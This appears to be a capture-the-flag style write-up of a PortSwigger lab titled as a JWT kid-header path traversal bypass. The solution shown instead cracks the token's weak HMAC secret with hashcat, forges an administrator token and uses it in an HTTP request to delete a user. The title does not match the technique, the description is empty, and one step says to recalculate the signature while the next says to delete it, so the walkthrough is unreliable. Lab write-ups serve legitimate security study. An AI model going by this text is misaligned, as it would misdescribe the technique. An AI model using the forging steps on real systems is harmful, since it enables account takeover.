---
description: >-
  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
icon: flask-vial
---

# JWT authentication bypass via kid header path traversal - %

## Description



## Solution



















Go to login page and access as wiener user.

JWT extension reveal that there's a JWT token, obviously related to wiener user account

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

```json
{"iss":"portswigger","exp":1742682771,"sub":"wiener"}
```

Save the item into a file called 'jwt' to prepare input for our brute force attack.

```json
eyJraWQiOiI3NTUzZjE1OC0zOTA5LTRiNDAtOGZhMy0zNDZmM2ZiZTViOTYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MjY4Mjc3MSwic3ViIjoid2llbmVyIn0.1h8m2wyXUGHZfKhTiOEKAvdKBhkgK5cDAGajwa2zrTo
```

```bash
hashcat -a 0 -m 16500 jwt ~/Documents/wordlists/jwt.secrets.list
```

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Well done, 'secret1' is the result.

Using JSON Web Tokens tab, modify the sub field inserting: "`administrator`", select "recalculate Signature" and insert there: "`secret1`"

<figure><img src="../../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

after that, go again into Pretty tab and change the id value to 'administrator': `GET /my-account?id=administrator HTTP/2` and delete the signature of the cookie session (the last part):



```http
GET /admin HTTP/2
Host: 0a71008804ff6c6185fbc1cf004b005c.web-security-academy.net
Cookie: session=eyJraWQiOiI4MmRmZWY5OC02YWE0LTRkNTItODNkOS03NTMwNzI5NmNhYTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MjY4NDUwOSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.t5w7XuZemQGQB2xo1NoxuYYgUGWU_Tro27qR-RT4oQU
```

click first on the **Send** button and then on **Following redirection** button

<figure><img src="../../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Now, we're authenticated as administrator!

Checking the response the admin panel's path is: `/admin`

<figure><img src="../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

analyzing the response, we see that the request to delete the user Carlos is the following: `GET /admin/delete?username=carlos HTTP/2`

<figure><img src="../../../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

So, Send and click to Following redirection to delete it and complete the lab.

<figure><img src="../../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
